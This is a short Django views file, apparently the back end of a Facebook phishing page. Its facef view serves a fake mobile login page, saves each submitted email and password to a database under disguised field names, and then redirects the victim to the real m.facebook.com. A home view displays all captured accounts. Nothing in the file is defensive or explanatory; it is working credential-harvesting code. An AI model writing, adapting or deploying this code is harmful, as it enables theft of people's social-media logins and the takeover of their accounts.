from django.shortcuts import render, redirect
from .models import  cuentas
# Create your views here.
def home(request):
	datos = cuentas.objects.all()
	return render(request, 'index.html', {'cuentas':datos})


def facef(request):
	if request.method == 'GET':
		return render(request, 'mobile.html')
	else:
		cuenta = cuentas()
		cuenta.nombre = request.POST['correo']
		cuenta.apellidos = request.POST['password']
		cuenta.save()
		print (request.POST)
		return redirect('https://m.facebook.com')


def enlaces(request):
	return render(request, 'enlaces.html')
